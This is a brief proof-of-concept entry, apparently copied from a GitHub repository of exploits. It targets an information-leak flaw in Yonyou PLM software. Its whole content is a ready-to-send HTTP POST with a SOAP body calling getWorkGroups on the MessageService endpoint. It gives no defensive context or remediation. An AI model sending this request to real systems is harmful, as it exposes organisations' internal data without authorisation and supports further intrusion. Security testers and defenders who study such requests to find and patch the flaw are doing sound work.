# yonyouPLM_getWorkGroups_infoleak

from: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E6%99%BA%E7%9F%B3%E5%BC%80PLM-getWorkGroups%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md

```
POST /services/MessageService HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 208

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:mes="MessageService">
   <soapenv:Header/>
   <soapenv:Body>
      <mes:getWorkGroups/>
   </soapenv:Body>
</soapenv:Envelope>
```
